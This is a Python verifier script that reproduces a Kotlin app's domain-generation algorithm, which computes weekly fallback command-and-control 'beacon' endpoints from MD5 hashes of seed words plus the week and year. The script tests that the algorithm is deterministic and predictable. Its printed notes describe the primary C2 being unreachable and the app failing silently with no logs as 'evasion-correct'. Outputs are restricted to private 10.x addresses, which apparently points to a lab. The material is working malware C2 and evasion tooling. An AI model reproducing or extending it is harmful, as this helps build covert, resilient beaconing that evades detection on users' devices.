#!/usr/bin/env python3
"""
DGA Algorithm Verifier — mirrors DomainResolver.kt exactly.

Computes this week's fallback candidates offline so we know
what the live test should produce. Same algorithm:
  seed = "{variant}{week}{year}"
  hash = MD5(seed)
  octets = first 3 hash bytes mod 254 + 1
  port = PORTS[hash.hashCode() mod len(PORTS)]
  endpoint = "http://10.{o1}.{o2}.{o3}:{port}/api/v1/beacon"
"""
import hashlib
from datetime import datetime

PORTS = [8080, 8443, 9090, 3000]
SEEDS = ["alpha", "bravo", "charlie", "delta"]

def md5_hex(s: str) -> str:
    return hashlib.md5(s.encode("utf-8")).hexdigest()

def hash_to_octets(hex_str: str) -> list[int]:
    """First 3 bytes of MD5 hex → octets in 1-254 range."""
    b = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
    return [(b[0] % 254) + 1, (b[1] % 254) + 1, (b[2] % 254) + 1]

def java_string_hashcode(s: str) -> int:
    """Mirror Java's String.hashCode() for port selection."""
    h = 0
    for c in s:
        h = (31 * h + ord(c)) & 0xFFFFFFFF
    # Convert to signed 32-bit
    if h >= 0x80000000:
        h -= 0x100000000
    return h

def generate_fallbacks(week: int, year: int) -> list[str]:
    candidates = []
    for seed in SEEDS:
        input_str = f"{seed}{week}{year}"
        h = md5_hex(input_str)
        octets = hash_to_octets(h)

        # Port selection mirrors Kotlin: hash.hashCode().and(0x7FFFFFFF) % PORTS.size
        jh = java_string_hashcode(h)
        port_idx = (jh & 0x7FFFFFFF) % len(PORTS)
        port = PORTS[port_idx]

        endpoint = f"http://10.{octets[0]}.{octets[1]}.{octets[2]}:{port}/api/v1/beacon"
        candidates.append(endpoint)
        print(f"  seed={seed!r:10s}  input={input_str!r:20s}  md5={h}  -> {endpoint}")
    return candidates

if __name__ == "__main__":
    now = datetime.now()
    week = now.isocalendar()[1]
    year = now.year

    print(f"=== DGA Verifier — {now.strftime('%Y-%m-%d')} ===")
    print(f"Week: {week}  Year: {year}")
    print()

    print("Current week candidates:")
    current = generate_fallbacks(week, year)
    print()

    # Verify ALL outputs are RFC1918
    all_safe = True
    for ep in current:
        from urllib.parse import urlparse
        host = urlparse(ep).hostname
        if not host.startswith("10."):
            print(f"  !! UNSAFE: {ep} — host {host} is NOT RFC1918")
            all_safe = False
    print(f"RFC1918 safety check: {'PASS' if all_safe else 'FAIL'}")
    print()

    # Show next week for predictability verification
    print(f"Next week ({week+1}) candidates:")
    next_week = generate_fallbacks(week + 1, year)
    print()

    # Verify determinism — run again, same output
    print("Determinism check (re-run current week):")
    rerun = generate_fallbacks(week, year)
    match = current == rerun
    print(f"Determinism: {'PASS' if match else 'FAIL'}")
    print()

    print("=== Primary endpoint (AppConfig) ===")
    print("  http://10.0.2.2:8080/api/v1/beacon")
    print()
    print("=== Expected live behavior (primary C2 DOWN) ===")
    print("  1. resolveEndpoint() tries primary → isReachable() = false")
    print("  2. generateFallbacks() produces 4 candidates above")
    print("  3. Each candidate: isRfc1918() = true, isReachable() = false (nothing listening)")
    print("  4. resolveEndpoint() returns null")
    print("  5. SyncTask.doWork() returns Result.failure() silently")
    print("  6. No crash, no retry, no logcat — silent failure (evasion-correct)")
